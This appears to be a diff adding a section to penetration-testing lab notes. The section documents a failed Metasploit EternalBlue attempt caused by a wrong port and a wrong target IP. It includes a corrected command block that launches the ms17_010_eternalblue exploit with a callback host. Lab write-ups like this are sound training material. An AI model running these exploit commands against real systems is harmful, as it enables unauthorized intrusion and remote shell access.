@@ -18,6 +18,27 @@ Archived **dead-end** lanes and operator mistakes. **Live plans:** [`../README.m
 
 Screenshots: [`101-003_enum4linux_access_denied_tm6_afrocha.png`](../../Screenshots/101-003_enum4linux_access_denied_tm6_afrocha.png), [`101-004_enum4linux_polenum_null_fail_tm6_afrocha.png`](../../Screenshots/101-004_enum4linux_polenum_null_fail_tm6_afrocha.png), [`101-005_enum4linux_groups_rid_fail_tm6_afrocha.png`](../../Screenshots/101-005_enum4linux_groups_rid_fail_tm6_afrocha.png).
 
+### Metasploit `ms17_010_eternalblue` — wrong target / wrong port (operator error)
+
+![MSF EternalBlue — connection refused; RPORT 80; RHOSTS 10.20.150.101](../../Screenshots/101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png)
+
+| Mistake | Why it breaks |
+|---------|----------------|
+| **`RPORT 80`** | **EternalBlue** is **SMB** — use **`RPORT 445`** (default). **Port 80** is **HTTP**; nothing answers **SMB** there → **`Connection refused`**. |
+| **`RHOSTS 10.20.150.101`** | Lab victim is **`10.20.160.101`**. **`10.20.150.*`** is often the **Kali / operator** side of the VPN — verify the **third octet** (**160** vs **150**). |
+| **`ForceExploit`** | Only after **`check`** / **`nmap smb-vuln-ms17-010`** show the host is actually vulnerable — do **not** override blindly on a patched VM. |
+
+**Correct shape (lab-authorized only):**
+
+```text
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.20.160.101
+set RPORT 445
+set LHOST <KALI_LAB_IP>
+check
+run
+```
+
 ---
 
 ## `10.20.160.102` — Shellshock / CGI / Metasploit (no shell via this lane)
